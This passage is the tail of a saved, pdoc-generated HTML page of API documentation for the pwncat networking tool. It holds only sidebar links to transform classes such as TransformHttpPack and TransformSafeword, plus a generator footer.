                                    title="pwncat.TransformHttpPack.transform">transform</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.TransformHttpUnpack"
                                title="pwncat.TransformHttpUnpack">TransformHttpUnpack</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TransformHttpUnpack.transform"
                                    title="pwncat.TransformHttpUnpack.transform">transform</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.TransformLinefeed"
                                title="pwncat.TransformLinefeed">TransformLinefeed</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TransformLinefeed.transform"
                                    title="pwncat.TransformLinefeed.transform">transform</a></code>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <h4><code><a
                                href="https://pwncat.org/pwncat.api.html#pwncat.TransformSafeword"
                                title="pwncat.TransformSafeword">TransformSafeword</a></code>
                        </h4>
                        <ul class="">
                            <li><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.TransformSafeword.transform"
                                    title="pwncat.TransformSafeword.transform">transform</a></code>
                            </li>
                        </ul>
                    </li>
                </ul>
            </li>
        </ul>
    </nav>
</main>
<footer id="footer">
    <p>Generated by <a href="https://pdoc3.github.io/pdoc"
                       title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.
    </p>
</footer>

</body>
<iframe frameborder="0" height="100%" id="mj-prompt-popup-id"
        src="./pwncat API documentation_files/popup.html" style="background: #fff;border: 1px solid #ddd; display: none; border-radius: 8px; top: 0;
right: 0;position: fixed;z-index: 9999999999;" width="555"></iframe>
</html>